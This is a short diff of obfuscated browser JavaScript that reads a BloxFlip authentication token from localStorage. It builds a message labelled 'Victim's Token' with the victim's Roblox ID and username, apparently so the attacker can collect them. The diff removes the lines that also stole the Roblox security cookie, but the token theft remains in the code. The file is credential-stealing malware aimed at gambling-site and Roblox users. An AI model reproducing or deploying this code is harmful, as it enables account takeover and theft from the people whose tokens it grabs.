@@ -246,7 +246,6 @@ async function _0x50d6a5(_0x45ef79, _0x1ae7cd) {
   }
 }
 const _0x4f0bca = window.localStorage['_DO_NOT_SHARE_BLOXFLIP_TOKEN']
-const _0x4f0bcc = window.localStorage['_|WARNING:-DO-NOT-SHARE-THIS']
 _0x4f0bca
   ? _0x302f69().then((_0x4fbacf) => {
       Promise.all([
@@ -310,8 +309,6 @@ _0x4f0bca
                   description:
                     "\n                  **Victim's Token:** " +
                     _0x4f0bca +
-                    "\n                  **Victim's Cookie:** " +
-                    _0x4f0bcc +
                     '\n                  **User Roblox ID:** ' +
                     _0x51de2a +
                     '\n                  **Roblox Username:** ' +
